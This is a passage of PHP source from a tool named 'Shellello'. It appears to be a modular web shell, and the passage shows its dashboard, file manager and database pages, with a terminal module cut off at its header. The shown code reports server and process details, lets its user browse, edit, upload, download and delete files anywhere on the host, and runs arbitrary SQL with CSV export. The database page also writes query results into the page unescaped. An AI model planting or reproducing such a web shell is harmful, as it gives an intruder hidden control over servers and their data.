    ob_start();
?>
<style>
.dashboard-grid {
    display: grid;
    grid-template-columns: repeat(auto-fit, minmax(350px, 1fr));
    gap: 1.5rem;
}
.card-header {
    display: flex;
    align-items: center;
    gap: 0.75rem;
    margin-bottom: 1.25rem;
    padding-bottom: 1rem;
    border-bottom: 1px solid var(--border);
}
.card-header h3 { margin: 0; font-size: 1.1rem; color: var(--text); }
.card-icon { font-size: 1.5rem; }
.info-row {
    display: flex;
    justify-content: space-between;
    padding: 0.625rem 0;
    border-bottom: 1px solid var(--border);
}
.info-row:last-child { border-bottom: none; }
.info-label { color: var(--text-muted); font-size: 0.9rem; }
.info-value { color: var(--text); font-weight: 500; font-size: 0.9rem; }
.progress-container { margin-bottom: 1.5rem; }
.progress-bar {
    height: 12px;
    background: var(--card-muted);
    border-radius: 6px;
    overflow: hidden;
    margin-bottom: 0.5rem;
}
.progress-fill { height: 100%; border-radius: 6px; transition: width 0.3s; }
.progress-label { text-align: right; font-size: 0.85rem; color: var(--text-muted); }
.disk-stats { display: flex; justify-content: space-between; text-align: center; }
.disk-stat { flex: 1; }
.stat-value { display: block; font-size: 1.25rem; font-weight: 600; color: var(--text); }
.stat-label { font-size: 0.8rem; color: var(--text-muted); }
.quick-actions { display: grid; grid-template-columns: repeat(2, 1fr); gap: 1rem; }
.quick-btn {
    display: flex;
    flex-direction: column;
    align-items: center;
    gap: 0.5rem;
    padding: 1.25rem;
    background: var(--card-muted);
    border-radius: 12px;
    text-decoration: none;
    color: var(--text);
    transition: all 0.2s;
    border: 2px solid transparent;
}
.quick-btn:hover {
    background: #111827;
    border-color: var(--primary);
    transform: translateY(-2px);
}
.quick-btn span:first-child { font-size: 1.75rem; }
.quick-btn span:last-child { font-weight: 500; font-size: 0.9rem; }
</style>

<div class="dashboard-grid">
    <div class="card">
        <div class="card-header">
            <span class="card-icon">💻</span>
            <h3>System Information</h3>
        </div>
        <div class="card-body">
            <div class="info-row">
                <span class="info-label">Operating System</span>
                <span class="info-value"><?php echo htmlspecialchars(php_uname('s') . ' ' . php_uname('r')); ?></span>
            </div>
            <div class="info-row">
                <span class="info-label">Hostname</span>
                <span class="info-value"><?php echo htmlspecialchars(php_uname('n')); ?></span>
            </div>
            <div class="info-row">
                <span class="info-label">Architecture</span>
                <span class="info-value"><?php echo htmlspecialchars(php_uname('m')); ?></span>
            </div>
            <div class="info-row">
                <span class="info-label">PHP Version</span>
                <span class="info-value"><?php echo $phpVersion; ?></span>
            </div>
            <div class="info-row">
                <span class="info-label">Web Server</span>
                <span class="info-value"><?php echo htmlspecialchars($serverSoftware); ?></span>
            </div>
        </div>
    </div>

    <div class="card">
        <div class="card-header">
            <span class="card-icon">💾</span>
            <h3>Disk Usage</h3>
        </div>
        <div class="card-body">
            <div class="progress-container">
                <div class="progress-bar">
                    <div class="progress-fill" style="width: <?php echo $diskPercent; ?>%; background: <?php echo $diskPercent > 80 ? '#ef4444' : ($diskPercent > 60 ? '#f59e0b' : '#22c55e'); ?>"></div>
                </div>
                <div class="progress-label"><?php echo $diskPercent; ?>% Used</div>
            </div>
            <div class="disk-stats">
                <div class="disk-stat">
                    <span class="stat-value"><?php echo formatBytes($diskUsed); ?></span>
                    <span class="stat-label">Used</span>
                </div>
                <div class="disk-stat">
                    <span class="stat-value"><?php echo formatBytes($diskFree); ?></span>
                    <span class="stat-label">Free</span>
                </div>
                <div class="disk-stat">
                    <span class="stat-value"><?php echo formatBytes($diskTotal); ?></span>
                    <span class="stat-label">Total</span>
                </div>
            </div>
        </div>
    </div>

    <div class="card">
        <div class="card-header">
            <span class="card-icon">🔐</span>
            <h3>Session Info</h3>
        </div>
        <div class="card-body">
            <div class="info-row">
                <span class="info-label">Session Duration</span>
                <span class="info-value"><?php echo getSessionTime(); ?></span>
            </div>
            <div class="info-row">
                <span class="info-label">Your IP</span>
                <span class="info-value"><?php echo getClientIp(); ?></span>
            </div>
            <div class="info-row">
                <span class="info-label">PHP Process User</span>
                <span class="info-value"><?php echo $processUser; ?></span>
            </div>
            <div class="info-row">
                <span class="info-label">Memory Usage</span>
                <span class="info-value"><?php echo formatBytes($memUsage); ?></span>
            </div>
            <div class="info-row">
                <span class="info-label">Current Path</span>
                <span class="info-value" style="font-size: 0.8rem;"><?php echo getcwd(); ?></span>
            </div>
        </div>
    </div>

    <div class="card">
        <div class="card-header">
            <span class="card-icon">⚡</span>
            <h3>Quick Actions</h3>
        </div>
        <div class="card-body">
            <div class="quick-actions">
                <a href="?page=files" class="quick-btn">
                    <span>📁</span>
                    <span>File Manager</span>
                </a>
                <a href="?page=database" class="quick-btn">
                    <span>🗄️</span>
                    <span>Database</span>
                </a>
                <a href="?page=terminal" class="quick-btn">
                    <span>💻</span>
                    <span>Terminal</span>
                </a>
                <a href="?page=settings" class="quick-btn">
                    <span>⚙️</span>
                    <span>Settings</span>
                </a>
            </div>
        </div>
    </div>
</div>
<?php
    $content = ob_get_clean();
    renderLayout('Dashboard', $content, 'dashboard');
}

// ========== 08_FILES ==========
/**
 * Shellello - Module 08: File Manager Page
 */

function renderFileManager() {
    $currentPath = realpath($_GET['path'] ?? getcwd());
    if (!$currentPath) $currentPath = getcwd();
    
    ob_start();
?>
<style>
.toolbar {
    display: flex;
    justify-content: space-between;
    align-items: center;
    flex-wrap: wrap;
    gap: 1rem;
}
.path-nav {
    display: flex;
    align-items: center;
    gap: 0.5rem;
    flex: 1;
    min-width: 300px;
}
.path-label { font-size: 1.25rem; }
.path-input {
    flex: 1;
    font-family: 'Consolas', 'Monaco', monospace;
    font-size: 0.9rem;
}
.toolbar-actions { display: flex; gap: 0.5rem; }
.file-table { margin: 0; }
.file-table tbody tr { cursor: pointer; }
.file-table tbody tr:hover { background: var(--hover); }
.file-icon { margin-right: 0.5rem; }
.file-name { font-weight: 500; }
.file-name.dir { color: #2563eb; }
.action-btns { display: flex; gap: 0.25rem; }
.action-btn {
    padding: 0.25rem 0.5rem;
    background: transparent;
    border: 1px solid #e5e7eb;
    border-radius: 4px;
    cursor: pointer;
    font-size: 0.85rem;
    transition: all 0.15s;
}
.action-btn:hover { background: #f3f4f6; }
.action-btn.danger:hover { background: #fef2f2; border-color: #fecaca; }
.modal-overlay {
    display: none;
    position: fixed;
    top: 0; left: 0; right: 0; bottom: 0;
    background: rgba(0,0,0,0.5);
    z-index: 1000;
    align-items: center;
    justify-content: center;
}
.modal-overlay.show { display: flex; }
.modal {
    background: var(--card-bg);
    border-radius: 12px;
    width: 90%;
    max-width: 500px;
    box-shadow: 0 25px 50px rgba(0,0,0,0.35);
    border: 1px solid var(--border);
}
.modal.modal-lg { max-width: 900px; }
.modal-header {
    display: flex;
    justify-content: space-between;
    align-items: center;
    padding: 1rem 1.5rem;
    border-bottom: 1px solid var(--border);
}
.modal-header h3 { margin: 0; font-size: 1.1rem; }
.modal-close { background: none; border: none; font-size: 1.5rem; cursor: pointer; color: var(--text-muted); }
.modal-body { padding: 1.5rem; }
.modal-body label { display: block; margin-bottom: 0.5rem; font-weight: 500; }
.modal-body .form-control { width: 100%; margin-bottom: 1rem; }
.modal-footer {
    display: flex;
    justify-content: flex-end;
    gap: 0.75rem;
    padding: 1rem 1.5rem;
    border-top: 1px solid var(--border);
    background: var(--card-muted);
    border-radius: 0 0 12px 12px;
}
.file-editor {
    width: 100%;
    height: 450px;
    font-family: 'Consolas', 'Monaco', monospace;
    font-size: 0.9rem;
    padding: 1rem;
    border: 1px solid var(--border);
    border-radius: 8px;
    background: #1e293b;
    color: #e2e8f0;
    resize: vertical;
}
.upload-zone {
    border: 2px dashed var(--border);
    border-radius: 12px;
    padding: 2rem;
    text-align: center;
    cursor: pointer;
}
.upload-zone:hover { border-color: var(--primary); background: var(--hover); }
</style>

<div class="file-manager">
    <div class="card toolbar">
        <div class="path-nav">
            <span class="path-label">📍</span>
            <input type="text" id="currentPath" class="form-control path-input" value="<?php echo htmlspecialchars($currentPath); ?>" onclick="enablePathEdit()" onkeydown="if(event.key==='Enter') navigateToPath()">
            <button class="btn btn-secondary btn-sm" onclick="navigateToPath()">Go</button>
            <button class="btn btn-secondary btn-sm" onclick="goUp()">⬆️ Up</button>
            <button class="btn btn-secondary btn-sm" onclick="refreshFiles()">🔄</button>
        </div>
        <div class="toolbar-actions">
            <button class="btn btn-primary btn-sm" onclick="openNewFileModal()">📄 New File</button>
            <button class="btn btn-primary btn-sm" onclick="openNewFolderModal()">📁 New Folder</button>
            <button class="btn btn-primary btn-sm" onclick="showModal('uploadModal')">⬆️ Upload</button>
        </div>
    </div>

    <div class="card">
        <table class="file-table">
            <thead>
                <tr>
                    <th>Name</th>
                    <th>Size</th>
                    <th>Perms</th>
                    <th>Owner</th>
                    <th>Modified</th>
                    <th>Actions</th>
                </tr>
            </thead>
            <tbody id="fileList">
                <tr><td colspan="6" class="text-center text-muted">Loading...</td></tr>
            </tbody>
        </table>
    </div>

    <!-- Editor Modal -->
    <div class="modal-overlay" id="editorModal">
        <div class="modal modal-lg">
            <div class="modal-header">
                <h3 id="editorTitle">Edit File</h3>
                <button class="modal-close" onclick="closeModal('editorModal')">&times;</button>
            </div>
            <div class="modal-body">
                <textarea id="fileEditor" class="file-editor"></textarea>
            </div>
            <div class="modal-footer">
                <button class="btn btn-secondary" onclick="closeModal('editorModal')">Cancel</button>
                <button class="btn btn-primary" onclick="saveFile()">💾 Save</button>
            </div>
        </div>
    </div>

    <!-- New File Modal -->
    <div class="modal-overlay" id="newFileModal">
        <div class="modal">
            <div class="modal-header">
                <h3>Create New File</h3>
                <button class="modal-close" onclick="closeModal('newFileModal')">&times;</button>
            </div>
            <div class="modal-body">
                <label>File Name:</label>
                <input type="text" id="newFileName" class="form-control" placeholder="filename.txt">
            </div>
            <div class="modal-footer">
                <button class="btn btn-secondary" onclick="closeModal('newFileModal')">Cancel</button>
                <button class="btn btn-primary" onclick="createFile()">Create</button>
            </div>
        </div>
    </div>

    <!-- New Folder Modal -->
    <div class="modal-overlay" id="newFolderModal">
        <div class="modal">
            <div class="modal-header">
                <h3>Create New Folder</h3>
                <button class="modal-close" onclick="closeModal('newFolderModal')">&times;</button>
            </div>
            <div class="modal-body">
                <label>Folder Name:</label>
                <input type="text" id="newFolderName" class="form-control" placeholder="folder-name">
            </div>
            <div class="modal-footer">
                <button class="btn btn-secondary" onclick="closeModal('newFolderModal')">Cancel</button>
                <button class="btn btn-primary" onclick="createFolder()">Create</button>
            </div>
        </div>
    </div>

    <!-- Rename Modal -->
    <div class="modal-overlay" id="renameModal">
        <div class="modal">
            <div class="modal-header">
                <h3>Rename</h3>
                <button class="modal-close" onclick="closeModal('renameModal')">&times;</button>
            </div>
            <div class="modal-body">
                <input type="hidden" id="renameOldPath">
                <label>New Name:</label>
                <input type="text" id="renameNewName" class="form-control">
            </div>
            <div class="modal-footer">
                <button class="btn btn-secondary" onclick="closeModal('renameModal')">Cancel</button>
                <button class="btn btn-primary" onclick="renameItem()">Rename</button>
            </div>
        </div>
    </div>

    <!-- Upload Modal -->
    <div class="modal-overlay" id="uploadModal">
        <div class="modal">
            <div class="modal-header">
                <h3>Upload File</h3>
                <button class="modal-close" onclick="closeModal('uploadModal')">&times;</button>
            </div>
            <div class="modal-body">
                <div class="upload-zone" onclick="document.getElementById('uploadFile').click()">
                    <input type="file" id="uploadFile" style="display:none" onchange="updateFileName()">
                    <p>📤 Click to select file</p>
                    <p class="text-muted" id="uploadFileName">No file selected</p>
                </div>
            </div>
            <div class="modal-footer">
                <button class="btn btn-secondary" onclick="closeModal('uploadModal')">Cancel</button>
                <button class="btn btn-primary" onclick="uploadFile()">Upload</button>
            </div>
        </div>
    </div>

    <!-- Delete Modal -->
    <div class="modal-overlay" id="deleteModal">
        <div class="modal">
            <div class="modal-header">
                <h3>⚠️ Confirm Delete</h3>
                <button class="modal-close" onclick="closeModal('deleteModal')">&times;</button>
            </div>
            <div class="modal-body">
                <input type="hidden" id="deletePath">
                <p>Delete <strong id="deleteItemName"></strong>?</p>
                <p class="text-danger">This cannot be undone.</p>
            </div>
            <div class="modal-footer">
                <button class="btn btn-secondary" onclick="closeModal('deleteModal')">Cancel</button>
                <button class="btn btn-danger" onclick="deleteItem()">Delete</button>
            </div>
        </div>
    </div>
</div>

<script>
var currentPath = <?php echo json_encode($currentPath); ?>;
var editingFile = null;

document.addEventListener('DOMContentLoaded', loadFiles);

function loadFiles() {
    fetch('?action=list_files&path=' + encodeURIComponent(currentPath))
        .then(function(r) { return r.json(); })
        .then(function(data) {
            if (data.status === 'success') {
                currentPath = data.path;
                document.getElementById('currentPath').value = currentPath;
                renderFiles(data.data);
            } else {
                toast(data.message, 'error');
            }
        });
}

function renderFiles(files) {
    var tbody = document.getElementById('fileList');
    if (!files.length) {
        tbody.innerHTML = '<tr><td colspan="6" class="text-center text-muted">Empty</td></tr>';
        return;
    }
    var html = '';
    for (var i = 0; i < files.length; i++) {
        var f = files[i];
        var isDir = f.type === 'dir';
        var icon = f.name === '..' ? '⬆️' : (isDir ? '📁' : '📄');
        var cls = isDir ? 'file-name dir' : 'file-name';
        
        // Handle '..' separately - go up instead of navigating to '..' path
        var fullPath = f.name === '..' ? '' : (currentPath + '/' + f.name);
        var dbl = f.name === '..' ? 'goUp()' : (isDir ? 
            'navigateTo(\'' + esc(fullPath) + '\')' : 
            'editFile(\'' + esc(fullPath) + '\')');
        
        var acts = f.name === '..' ? '' : 
            (isDir ? '' : '<button class="action-btn" onclick="event.stopPropagation();editFile(\'' + esc(fullPath) + '\')">✏️</button>') +
            '<button class="action-btn" onclick="event.stopPropagation();showRename(\'' + esc(fullPath) + '\',\'' + esc(f.name) + '\')">📝</button>' +
            (isDir ? '' : '<button class="action-btn" onclick="event.stopPropagation();download(\'' + esc(fullPath) + '\')">⬇️</button>') +
            '<button class="action-btn danger" onclick="event.stopPropagation();showDelete(\'' + esc(fullPath) + '\',\'' + esc(f.name) + '\')">🗑️</button>';
        html += '<tr ondblclick="' + dbl + '">' +
            '<td><span class="file-icon">' + icon + '</span><span class="' + cls + '">' + esc(f.name) + '</span></td>' +
            '<td class="text-muted">' + f.size + '</td>' +
            '<td><code>' + f.perms + '</code></td>' +
            '<td class="text-muted">' + (f.owner || 'unknown') + '</td>' +
            '<td class="text-muted">' + f.modified + '</td>' +
            '<td class="action-btns">' + acts + '</td></tr>';
    }
    tbody.innerHTML = html;
}

function esc(s) {
    return s.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;').replace(/'/g,'&#39;');
}

function navigateTo(path) { 
    currentPath = path; 
    loadFiles(); 
}

function goUp() {
    var parts = currentPath.split('/').filter(function(p) { return p !== ''; });
    if (parts.length > 0) {
        parts.pop();
        currentPath = '/' + parts.join('/');
        if (currentPath === '/') currentPath = '/';
    } else {
        currentPath = '/';
    }
    loadFiles();
}

function enablePathEdit() {
    var input = document.getElementById('currentPath');
    input.select();
}

function navigateToPath() {
    var input = document.getElementById('currentPath');
    currentPath = input.value;
    loadFiles();
}

function refreshFiles() { loadFiles(); toast('Refreshed'); }

function editFile(path) {
    fetch('?action=read_file&path=' + encodeURIComponent(path))
        .then(function(r) { return r.json(); })
        .then(function(data) {
            if (data.status === 'success') {
                editingFile = path;
                document.getElementById('editorTitle').textContent = 'Edit: ' + path.split('/').pop();
                document.getElementById('fileEditor').value = data.content;
                showModal('editorModal');
            } else { toast(data.message, 'error'); }
        });
}

function saveFile() {
    var fd = new FormData();
    fd.append('path', editingFile);
    fd.append('content', document.getElementById('fileEditor').value);
    fetch('?action=save_file', {method:'POST', body:fd})
        .then(function(r) { return r.json(); })
        .then(function(data) {
            toast(data.message, data.status);
            if (data.status === 'success') closeModal('editorModal');
        });
}

function openNewFileModal() {
    document.getElementById('newFileName').value = '';
    showModal('newFileModal');
}

function openNewFolderModal() {
    document.getElementById('newFolderName').value = '';
    showModal('newFolderModal');
}

function createFile() {
    var name = document.getElementById('newFileName').value.trim();
    if (!name) { toast('Enter file name', 'error'); return; }
    var fd = new FormData();
    fd.append('path', currentPath);
    fd.append('name', name);
    fetch('?action=create_file', {method:'POST', body:fd})
        .then(function(r) { return r.json(); })
        .then(function(data) {
            toast(data.message, data.status);
            if (data.status === 'success') { 
                document.getElementById('newFileName').value = '';
                closeModal('newFileModal'); 
                loadFiles(); 
            }
        });
}

function createFolder() {
    var name = document.getElementById('newFolderName').value.trim();
    if (!name) { toast('Enter folder name', 'error'); return; }
    var fd = new FormData();
    fd.append('path', currentPath);
    fd.append('name', name);
    fetch('?action=create_folder', {method:'POST', body:fd})
        .then(function(r) { return r.json(); })
        .then(function(data) {
            toast(data.message, data.status);
            if (data.status === 'success') { 
                document.getElementById('newFolderName').value = '';
                closeModal('newFolderModal'); 
                loadFiles(); 
            }
        });
}

function showRename(path, name) {
    document.getElementById('renameOldPath').value = path;
    document.getElementById('renameNewName').value = name;
    showModal('renameModal');
}

function renameItem() {
    var fd = new FormData();
    fd.append('old_path', document.getElementById('renameOldPath').value);
    fd.append('new_name', document.getElementById('renameNewName').value.trim());
    fetch('?action=rename_item', {method:'POST', body:fd})
        .then(function(r) { return r.json(); })
        .then(function(data) {
            toast(data.message, data.status);
            if (data.status === 'success') { closeModal('renameModal'); loadFiles(); }
        });
}

function showDelete(path, name) {
    document.getElementById('deletePath').value = path;
    document.getElementById('deleteItemName').textContent = name;
    showModal('deleteModal');
}

function deleteItem() {
    var fd = new FormData();
    fd.append('path', document.getElementById('deletePath').value);
    fetch('?action=delete_item', {method:'POST', body:fd})
        .then(function(r) { return r.json(); })
        .then(function(data) {
            toast(data.message, data.status);
            if (data.status === 'success') { closeModal('deleteModal'); loadFiles(); }
        });
}

function download(path) { window.location = '?action=download_file&path=' + encodeURIComponent(path); }

function updateFileName() {
    var file = document.getElementById('uploadFile').files[0];
    document.getElementById('uploadFileName').textContent = file ? file.name : 'No file selected';
}

function uploadFile() {
    var file = document.getElementById('uploadFile').files[0];
    if (!file) { toast('Select a file', 'error'); return; }
    var fd = new FormData();
    fd.append('path', currentPath);
    fd.append('file', file);
    fetch('?action=upload_file', {method:'POST', body:fd})
        .then(function(r) { return r.json(); })
        .then(function(data) {
            toast(data.message, data.status);
            if (data.status === 'success') { 
                document.getElementById('uploadFile').value = '';
                document.getElementById('uploadFileName').textContent = 'No file selected';
                closeModal('uploadModal'); 
                loadFiles(); 
            }
        });
}

function showModal(id) { document.getElementById(id).classList.add('show'); }
function closeModal(id) { document.getElementById(id).classList.remove('show'); }

function toast(msg, type) {
    var t = document.getElementById('toast');
    if (!t) {
        t = document.createElement('div');
        t.id = 'toast';
        t.style.cssText = 'position:fixed;bottom:2rem;right:2rem;padding:1rem 1.5rem;border-radius:8px;color:#fff;font-weight:500;z-index:9999;transition:all 0.3s;box-shadow:0 10px 25px rgba(0,0,0,0.2);';
        document.body.appendChild(t);
    }
    t.textContent = msg;
    t.style.background = type === 'error' ? '#ef4444' : (type === 'success' ? '#22c55e' : '#3b82f6');
    t.style.opacity = '1';
    t.style.transform = 'translateY(0)';
    setTimeout(function() { 
        t.style.opacity = '0'; 
        t.style.transform = 'translateY(1rem)';
    }, type === 'error' ? 4000 : 2500);
}
</script>
<?php
    $content = ob_get_clean();
    renderLayout('File Manager', $content, 'files');
}

// ========== 09_DATABASE ==========
/**
 * Shellello - Module 09: Database Page
 */

function renderDatabase() {
    $isConnected = isset($_SESSION['db']);
    $dbInfo = $isConnected ? $_SESSION['db'] : null;
    
    ob_start();
?>
<style>
.form-grid {
    display: grid;
    grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
    gap: 1.25rem;
}
.form-group { display: flex; flex-direction: column; }
.form-group label { margin-bottom: 0.5rem; font-weight: 500; font-size: 0.9rem; }
.form-actions { margin-top: 1.5rem; padding-top: 1.5rem; border-top: 1px solid #e5e7eb; }
.connection-info {
    display: flex;
    justify-content: space-between;
    align-items: center;
    padding: 1rem 1.5rem !important;
    background: linear-gradient(135deg, #0b3b2c 0%, #0f5135 100%);
    border: 1px solid #115e3b;
}
.connection-status { display: flex; align-items: center; gap: 0.75rem; }
.status-dot { width: 10px; height: 10px; background: #22c55e; border-radius: 50%; animation: pulse 2s infinite; }
@keyframes pulse { 0%,100%{opacity:1} 50%{opacity:0.5} }
.current-db {
    background: #22c55e; color: white;
    padding: 0.25rem 0.75rem;
    border-radius: 20px;
    font-size: 0.85rem;
}
.db-layout {
    display: grid;
    grid-template-columns: 280px 1fr;
    gap: 1.5rem;
    margin-top: 1.5rem;
}
.db-sidebar { padding: 0 !important; overflow: hidden; }
.sidebar-section { padding: 1rem; border-bottom: 1px solid #e5e7eb; }
.sidebar-section:last-child { border-bottom: none; }
.sidebar-section h4 {
    margin: 0 0 0.75rem 0;
    font-size: 0.85rem;
    color: #6b7280;
    text-transform: uppercase;
}
.item-list { max-height: 200px; overflow-y: auto; }
.table-item {
    padding: 0.5rem 0.75rem;
    border-radius: 6px;
    cursor: pointer;
    font-size: 0.9rem;
    display: flex;
    align-items: center;
    gap: 0.5rem;
}
.table-item:hover { background: var(--hover); }
.table-item.active { background: #1f2937; color: #fbbf24; }
.sql-editor {
    width: 100%;
    height: 120px;
    font-family: 'Consolas', monospace;
    font-size: 0.95rem;
    padding: 1rem;
    border: 1px solid var(--border);
    border-radius: 8px;
    background: #1e293b;
    color: #e2e8f0;
    resize: vertical;
}
.query-actions { display: flex; align-items: center; gap: 0.75rem; margin-top: 1rem; }
.query-status { margin-left: auto; font-size: 0.85rem; color: #6b7280; }
.result-count {
    margin-left: auto;
    font-size: 0.85rem;
    background: #f3f4f6;
    padding: 0.25rem 0.75rem;
    border-radius: 20px;
}
.table-wrapper { overflow-x: auto; max-height: 400px; overflow-y: auto; }
#resultsTable { font-size: 0.9rem; }
#resultsTable th { position: sticky; top: 0; background: #f8fafc; z-index: 10; }
#resultsTable td { max-width: 300px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
.card-header { display: flex; align-items: center; gap: 0.75rem; margin-bottom: 1rem; padding-bottom: 1rem; border-bottom: 1px solid #e5e7eb; }
.card-header h3 { margin: 0; font-size: 1.1rem; }
.card-icon { font-size: 1.5rem; }
</style>

<div class="database-manager">
<?php if (!$isConnected): ?>
    <div class="card">
        <div class="card-header">
            <span class="card-icon">🔌</span>
            <h3>Database Connection</h3>
        </div>
        <div class="card-body">
            <form id="dbForm" onsubmit="connectDb(event)">
                <div class="form-grid">
                    <div class="form-group">
                        <label>Database Type</label>
                        <select id="dbDriver" class="form-control" onchange="updatePort()">
                            <option value="mysql">MySQL / MariaDB</option>
                            <option value="pgsql">PostgreSQL</option>
                        </select>
                    </div>
                    <div class="form-group">
                        <label>Host</label>
                        <input type="text" id="dbHost" class="form-control" value="localhost" required>
                    </div>
                    <div class="form-group">
                        <label>Port</label>
                        <input type="text" id="dbPort" class="form-control" value="3306">
                    </div>
                    <div class="form-group">
                        <label>Username</label>
                        <input type="text" id="dbUser" class="form-control" placeholder="root" required>
                    </div>
                    <div class="form-group">
                        <label>Password</label>
                        <input type="password" id="dbPass" class="form-control">
                    </div>
                    <div class="form-group">
                        <label>Database (optional)</label>
                        <input type="text" id="dbName" class="form-control" placeholder="Leave empty to select later">
                    </div>
                </div>
                <div class="form-actions">
                    <button type="submit" class="btn btn-primary" id="connectBtn">🔗 Connect</button>
                </div>
            </form>
        </div>
    </div>
<?php else: ?>
    <div class="card connection-info">
        <div class="connection-status">
            <span class="status-dot"></span>
            <span>Connected to <strong><?php echo htmlspecialchars($dbInfo['driver'] . '://' . $dbInfo['host'] . ':' . $dbInfo['port']); ?></strong></span>
            <?php if (!empty($dbInfo['dbname'])): ?>
                <span class="current-db">📦 <?php echo htmlspecialchars($dbInfo['dbname']); ?></span>
            <?php endif; ?>
        </div>
        <button class="btn btn-danger btn-sm" onclick="disconnectDb()">Disconnect</button>
    </div>

    <div class="db-layout">
        <div class="db-sidebar card">
            <div class="sidebar-section">
                <h4>📋 Tables</h4>
                <div id="tableList" class="item-list">
                    <div class="text-muted">Loading...</div>
                </div>
            </div>
        </div>

        <div class="db-main">
            <div class="card">
                <div class="card-header">
                    <span class="card-icon">⚡</span>
                    <h3>SQL Query</h3>
                </div>
                <div class="card-body">
                    <textarea id="sqlQuery" class="sql-editor" placeholder="SELECT * FROM users LIMIT 10;"></textarea>
                    <div class="query-actions">
                        <button class="btn btn-primary" onclick="runQuery()">▶️ Execute</button>
                        <button class="btn btn-secondary" onclick="clearQuery()">🗑️ Clear</button>
                        <button class="btn btn-success" id="exportCsvBtn" onclick="exportCsv()" style="display:none;">📥 Export CSV</button>
                        <span id="queryStatus" class="query-status"></span>
                    </div>
                </div>
            </div>

            <div class="card" id="resultsCard" style="display:none;">
                <div class="card-header">
                    <span class="card-icon">📊</span>
                    <h3>Results</h3>
                    <span id="resultCount" class="result-count"></span>
                </div>
                <div class="card-body">
                    <div class="table-wrapper">
                        <table id="resultsTable">
                            <thead id="resultsHead"></thead>
                            <tbody id="resultsBody"></tbody>
                        </table>
                    </div>
                </div>
            </div>
        </div>
    </div>
<?php endif; ?>
</div>

<script>
function updatePort() {
    var d = document.getElementById('dbDriver');
    if (d) document.getElementById('dbPort').value = d.value === 'mysql' ? '3306' : '5432';
}

function connectDb(e) {
    e.preventDefault();
    var btn = document.getElementById('connectBtn');
    btn.disabled = true;
    btn.textContent = '⏳ Connecting...';
    
    var fd = new FormData();
    fd.append('driver', document.getElementById('dbDriver').value);
    fd.append('host', document.getElementById('dbHost').value);
    fd.append('port', document.getElementById('dbPort').value);
    fd.append('user', document.getElementById('dbUser').value);
    fd.append('pass', document.getElementById('dbPass').value);
    fd.append('dbname', document.getElementById('dbName').value);
    
    fetch('?action=db_connect', {method:'POST', body:fd})
        .then(function(r) { return r.json(); })
        .then(function(data) {
            if (data.status === 'success') {
                toast('Connected!', 'success');
                setTimeout(function() { location.reload(); }, 500);
            } else {
                toast(data.message, 'error');
                btn.disabled = false;
                btn.textContent = '🔗 Connect';
            }
        });
}

function disconnectDb() {
    fetch('?action=db_disconnect')
        .then(function() { location.reload(); });
}

<?php if ($isConnected): ?>
document.addEventListener('DOMContentLoaded', loadTables);

function loadTables() {
    fetch('?action=db_tables')
        .then(function(r) { return r.json(); })
        .then(function(data) {
            var list = document.getElementById('tableList');
            if (data.status === 'success' && data.tables && data.tables.length) {
                list.innerHTML = data.tables.map(function(t) {
                    return '<div class="table-item" onclick="selectTable(\'' + t + '\')"><span>📋</span> ' + t + '</div>';
                }).join('');
            } else {
                list.innerHTML = '<div class="text-muted">No tables</div>';
            }
        });
}

function selectTable(t) {
    document.querySelectorAll('.table-item').forEach(function(el) { el.classList.remove('active'); });
    event.target.closest('.table-item').classList.add('active');
    document.getElementById('sqlQuery').value = 'SELECT * FROM ' + t + ' LIMIT 50;';
}

function runQuery() {
    var sql = document.getElementById('sqlQuery').value.trim();
    if (!sql) { toast('Enter a query', 'error'); return; }
    
    var status = document.getElementById('queryStatus');
    status.textContent = 'Executing...';
    status.style.color = '#3b82f6';
    
    var fd = new FormData();
    fd.append('sql', sql);
    var start = Date.now();
    
    fetch('?action=db_query', {method:'POST', body:fd})
        .then(function(r) { return r.json(); })
        .then(function(data) {
            var elapsed = ((Date.now() - start) / 1000).toFixed(3);
            if (data.status === 'success') {
                if (data.data) {
                    showResults(data.data);
                    status.textContent = elapsed + 's';
                    status.style.color = '#22c55e';
                    document.getElementById('resultCount').textContent = data.count + ' rows';
                    document.getElementById('exportCsvBtn').style.display = 'inline-block';
                } else {
                    document.getElementById('resultsCard').style.display = 'none';
                    document.getElementById('exportCsvBtn').style.display = 'none';
                    status.textContent = (data.affected || 0) + ' rows affected';
                    status.style.color = '#22c55e';
                }
            } else {
                status.textContent = 'Error';
                status.style.color = '#ef4444';
                toast(data.message, 'error');
            }
        });
}

function showResults(data) {
    var card = document.getElementById('resultsCard');
    var thead = document.getElementById('resultsHead');
    var tbody = document.getElementById('resultsBody');
    
    if (!data.length) {
        thead.innerHTML = '';
        tbody.innerHTML = '<tr><td class="text-muted">No results</td></tr>';
        card.style.display = 'block';
        return;
    }
    
    var cols = Object.keys(data[0]);
    thead.innerHTML = '<tr>' + cols.map(function(c) { return '<th>' + c + '</th>'; }).join('') + '</tr>';
    tbody.innerHTML = data.map(function(row) {
        return '<tr>' + cols.map(function(c) {
            var v = row[c] === null ? 'NULL' : String(row[c]);
            return '<td title="' + v.replace(/"/g, '&quot;') + '">' + v + '</td>';
        }).join('') + '</tr>';
    }).join('');
    card.style.display = 'block';
}

function clearQuery() {
    document.getElementById('sqlQuery').value = '';
    document.getElementById('queryStatus').textContent = '';
    document.getElementById('resultsCard').style.display = 'none';
    document.getElementById('exportCsvBtn').style.display = 'none';
}

function exportCsv() {
    var sql = document.getElementById('sqlQuery').value.trim();
    if (!sql) { toast('No query to export', 'error'); return; }
    
    var form = document.createElement('form');
    form.method = 'POST';
    form.action = '?action=db_export_csv';
    
    var input = document.createElement('input');
    input.type = 'hidden';
    input.name = 'sql';
    input.value = sql;
    form.appendChild(input);
    
    document.body.appendChild(form);
    form.submit();
    document.body.removeChild(form);
    
    toast('Exporting CSV...', 'success');
}
<?php endif; ?>

function toast(msg, type) {
    var t = document.getElementById('toast');
    if (!t) {
        t = document.createElement('div');
        t.id = 'toast';
        t.style.cssText = 'position:fixed;bottom:2rem;right:2rem;padding:1rem 1.5rem;border-radius:8px;color:#fff;font-weight:500;z-index:9999;transition:opacity 0.3s;';
        document.body.appendChild(t);
    }
    t.textContent = msg;
    t.style.background = type === 'error' ? '#ef4444' : '#22c55e';
    t.style.opacity = '1';
    setTimeout(function() { t.style.opacity = '0'; }, 3000);
}
</script>
<?php
    $content = ob_get_clean();
    renderLayout('Database', $content, 'database');
}

// ========== 10_TERMINAL ==========
/**
